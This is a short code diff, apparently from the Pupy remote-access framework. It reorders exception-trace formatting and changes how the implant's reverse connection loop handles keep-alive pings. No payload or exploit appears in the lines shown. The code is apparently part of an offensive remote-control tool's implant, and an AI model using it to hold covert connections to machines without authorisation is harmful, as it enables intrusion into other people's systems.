@@ -94,17 +94,17 @@ def print_exception(tag=''):
     remote_print_error = None
     dprint = None
 
+    trace = str(traceback.format_exc())
+    error = ' '.join([ x for x in (
+        tag, 'Exception:', trace
+    ) if x ])
+
     try:
         import pupyimporter
         remote_print_error = pupyimporter.remote_print_error
         dprint = pupyimporter.dprint
     except:
         pass
-
-    trace = str(traceback.format_exc())
-    error = ' '.join([ x for x in (
-        tag, 'Exception:', trace
-    ) if x ])
 
     if remote_print_error:
         try:
@@ -715,19 +715,19 @@ def rpyc_loop(launcher):
                 try:
                     conn = PupyConnection(
                         lock, None, ReverseSlaveService,
-                        PupyChannel(stream), config={}
+                        PupyChannel(stream), config={},
+                        ping=stream.KEEP_ALIVE_REQUIRED
                     )
                     conn._init_service()
                 finally:
                     event.set()
 
                 attempt = 0
+                lastping = None
+
                 with lock:
                     while not conn.closed:
-                        interval, timeout = conn.get_pings()
-                        conn.serve(interval or 10)
-                        if interval:
-                            conn.ping(timeout=timeout)
+                        conn.serve()
 
         except SystemExit:
             raise
